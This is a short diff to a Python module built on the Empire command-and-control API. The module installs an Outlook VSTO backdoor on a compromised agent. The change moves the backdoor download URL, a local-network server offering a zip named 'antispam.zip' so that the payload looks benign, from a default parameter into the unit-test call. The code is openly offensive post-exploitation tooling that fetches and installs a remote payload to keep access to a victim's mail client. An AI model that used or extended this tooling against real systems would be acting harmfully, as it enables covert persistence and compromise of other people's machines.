@@ -10,7 +10,7 @@ ENSURE vsto_reg_add is UPDATED if new VSTO add-in is compiled
 from EmpireAPIWrapper import empireAPI
 from c2_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER
 
-def run(API, agent_name, vsto_zip_backdoor_url='http://192.168.181.1:8000/antispam.zip'):
+def run(API, agent_name, vsto_zip_backdoor_url):
     """
     Installs Outlook VSTO backdoor 
     \n:param API: EmpireAPIWrapper object
@@ -87,4 +87,4 @@ def run(API, agent_name, vsto_zip_backdoor_url='http://192.168.181.1:8000/antisp
 
 if __name__ == '__main__': # unit test
     API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
-    print(run(API, API.agents()['agents'][0]['name']))
+    print(run(API, API.agents()['agents'][0]['name'], 'http://192.168.181.1:8000/antispam.zip'))
